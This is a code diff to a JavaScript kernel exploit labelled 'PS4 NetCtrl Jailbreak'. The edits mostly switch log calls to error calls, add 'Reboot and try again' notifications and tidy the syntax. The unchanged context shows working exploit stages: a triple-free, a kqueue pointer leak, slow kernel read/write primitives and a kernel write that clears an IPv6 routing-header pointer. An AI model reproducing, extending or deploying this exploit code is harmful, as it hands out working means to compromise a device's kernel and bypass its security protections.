@@ -1,5 +1,5 @@
-import { fn, syscalls, BigInt, utils, gadgets } from 'download0/types'
-import { hex, malloc, read16, read32, read64, write16, write32, write64, write8, get_kernel_offset, kernel, jailbreak_shared, read8 } from 'download0/kernel'
+import { fn, BigInt, utils, gadgets } from 'download0/types'
+import { hex, malloc, read16, read32, read64, write16, write32, write64, write8, get_kernel_offset, kernel, jailbreak_shared, read8, getsockopt_wrapper, BigInt_Error, kernel_offset, thr_exit_wrapper, setsockopt_wrapper, read_wrapper, writev_wrapper, rtprio_thread_wrapper, cpuset_setaffinity_wrapper, readv_wrapper, recvmsg_wrapper, longjmp_addr } from 'download0/kernel'
 import { binloader_init } from 'download0/loader'
 
 export function netctrl_exploit () {
@@ -135,11 +135,11 @@ export function netctrl_exploit () {
 
   const uio_readv_thread_ready = malloc(8 * UIO_THREAD_NUM)
   const uio_readv_thread_done = malloc(8 * UIO_THREAD_NUM)
-  const uio_readv_signal_buf = malloc(8 * UIO_THREAD_NUM)
+  const uio_readv_signal_buf = malloc(8 * IOV_THREAD_NUM)
 
   const uio_writev_thread_ready = malloc(8 * UIO_THREAD_NUM)
   const uio_writev_thread_done = malloc(8 * UIO_THREAD_NUM)
-  const uio_writev_signal_buf = malloc(8 * UIO_THREAD_NUM)
+  const uio_writev_signal_buf = malloc(8 * IOV_THREAD_NUM)
 
   const spray_ipv6_ready = malloc(8)
   const spray_ipv6_done = malloc(8)
@@ -563,7 +563,7 @@ export function netctrl_exploit () {
     // log('=== PS4 NetCtrl Jailbreak ===')
 
     if (FW_VERSION === null) {
-      log('Failed to detect PS4 firmware version.\nAborting...')
+      error('Failed to detect PS4 firmware version.\nAborting...')
       utils.notify('Failed to detect PS4 firmware version.\nAborting...')
       return false
     }
@@ -748,7 +748,8 @@ export function netctrl_exploit () {
       if (debugging.info.memory.available === 0) {
         zeroMemoryCount++
         if (zeroMemoryCount >= 5) {
-          log('netctrl failed!')
+          error('NetCtrl failed:\nReboot and try again')
+          utils.notify('NetCtrl failed:\nReboot and try again')
           cleanup()
           return false
         }
@@ -851,7 +852,8 @@ export function netctrl_exploit () {
         callback()
       } catch (e) {
         error('ERROR: ' + e.message)
-        error('Netctrl failed - Reboot and try again')
+        error('Netctrl failed: Reboot and try again')
+        utils.notify('NetCtrl failed:\nReboot and try again')
         cleanup()
       }
     }, 0)
@@ -870,7 +872,8 @@ export function netctrl_exploit () {
 
   function exploit_phase_trigger () {
     if (exploit_count >= MAIN_LOOP_ITERATIONS) {
-      log('Failed to acquire kernel R/W')
+      error('Failed to acquire kernel R/W. Reboot and try again')
+      utils.notify('NetCtrl failed:\nReboot and try again')
       cleanup()
       return
     }
@@ -954,7 +957,7 @@ export function netctrl_exploit () {
       }
     }
 
-    if (kws_success == 0) {
+    if (kws_success === 0) {
       throw new Error('kwriteslow master_r_pipe_data: BigInt_Error')
     }
 
@@ -1080,8 +1083,7 @@ export function netctrl_exploit () {
         const so_pcb = kread64(f_data.add(0x18))
         const in6p_outputopts = kread64(so_pcb.add(0x118))
         kwrite64(in6p_outputopts.add(0x68), new BigInt(0)) // ip6po_rhi_rthdr
-      }
-      else {
+      } else {
         debug('Skipped wrong fp: ' + hex(fp) + ' for fd: ' + fd)
       }
     }
@@ -1333,7 +1335,7 @@ export function netctrl_exploit () {
     }
 
     if (main_count === TRIPLEFREE_ITERATIONS) {
-      log('Failed to Triple Free')
+      error('Failed to Triple Free')
       return false
     }
     return true
@@ -1370,7 +1372,7 @@ export function netctrl_exploit () {
     }
     if (count === KQUEUE_ITERATIONS) {
       // Dropped out with no kqueue leak
-      log('Failed to leak kqueue_fdp')
+      error('Failed to leak kqueue_fdp')
       return false
     }
 
@@ -1380,7 +1382,7 @@ export function netctrl_exploit () {
     kq_fdp = read64(leak_rthdr.add(0x98))
 
     if (kq_fdp.eq(0)) {
-      log('Failed to leak kqueue_fdp')
+      error('Failed to leak kqueue_fdp')
       return false
     }
 
@@ -1427,7 +1429,8 @@ export function netctrl_exploit () {
 
     // Memory exhaustion check
     if (debugging.info.memory.available === 0) {
-      log('kreadslow - Memory exhausted before start')
+      error('kreadslow - Memory exhausted before start. Reboot and try again.')
+      utils.notify('NetCtrl failed:\nReboot and try again')
       cleanup()
       return BigInt_Error
     }
@@ -1467,7 +1470,8 @@ export function netctrl_exploit () {
       if (debugging.info.memory.available === 0) {
         zeroMemoryCount++
         if (zeroMemoryCount >= 5) {
-          log('netctrl failed!')
+          error('NetCtrl failed:\nReboot and try again')
+          utils.notify('NetCtrl failed:\nReboot and try again')
           cleanup()
           return BigInt_Error
         }
@@ -1502,7 +1506,8 @@ export function netctrl_exploit () {
     }
 
     if (count === 10000) {
-      debug('kreadslow - Failed uio reclaim after 10000 iterations')
+      error('kreadslow - Failed uio reclaim after 10000 iterations. Reboot and try again.')
+      utils.notify('NetCtrl failed:\nReboot and try again')
       return BigInt_Error
     }
 
@@ -1532,7 +1537,8 @@ export function netctrl_exploit () {
       if (debugging.info.memory.available === 0) {
         zeroMemoryCount2++
         if (zeroMemoryCount2 >= 5) {
-          log('netctrl failed!')
+          error('NetCtrl failed:\nReboot and try again')
+          utils.notify('NetCtrl failed:\nReboot and try again')
           cleanup()
           return BigInt_Error
         }
@@ -1587,7 +1593,8 @@ export function netctrl_exploit () {
     write(new BigInt(iov_sock_1), tmp, 1)
 
     if (leak_buffer.eq(0)) {
-      debug('kreadslow - No valid leak found')
+      error('kreadslow - No valid leak found. Reboot and try again.')
+      utils.notify('NetCtrl failed:\nReboot and try again')
       wait_iov_recvmsg()
       read(new BigInt(iov_sock_0), tmp, 1)
       return BigInt_Error
@@ -1605,7 +1612,8 @@ export function netctrl_exploit () {
     debug('kreadslow - triplets[2]=' + triplets[2])
 
     if (triplets[2] === -1) {
-      debug('kreadslow - Failed to find triplets[2]')
+      error('kreadslow - Failed to find triplets[2]. Reboot and try again.')
+      utils.notify('NetCtrl failed:\nReboot and try again')
       wait_iov_recvmsg()
       read(new BigInt(iov_sock_0), tmp, 1)
       return BigInt_Error
@@ -1654,7 +1662,8 @@ export function netctrl_exploit () {
       if (debugging.info.memory.available === 0) {
         zeroMemoryCount++
         if (zeroMemoryCount >= 5) {
-          log('netctrl failed!')
+          error('NetCtrl failed:\nReboot and try again')
+          utils.notify('NetCtrl failed:\nReboot and try again')
           cleanup()
           return BigInt_Error
         }
@@ -1698,7 +1707,8 @@ export function netctrl_exploit () {
       if (debugging.info.memory.available === 0) {
         zeroMemoryCount2++
         if (zeroMemoryCount2 >= 5) {
-          log('netctrl failed!')
+          error('NetCtrl failed:\nReboot and try again')
+          utils.notify('NetCtrl failed:\nReboot and try again')
           cleanup()
           return BigInt_Error
         }
@@ -1745,7 +1755,8 @@ export function netctrl_exploit () {
     }
 
     if (triplets[2] === -1) {
-      debug('kwriteslow - Failed to find triplets[2]')
+      error('kwriteslow - Failed to find triplets[2]. Reboot and try again.')
+      utils.notify('NetCtrl failed:\nReboot and try again')
       wait_iov_recvmsg()
       read(new BigInt(iov_sock_0), tmp, 1)
       return BigInt_Error
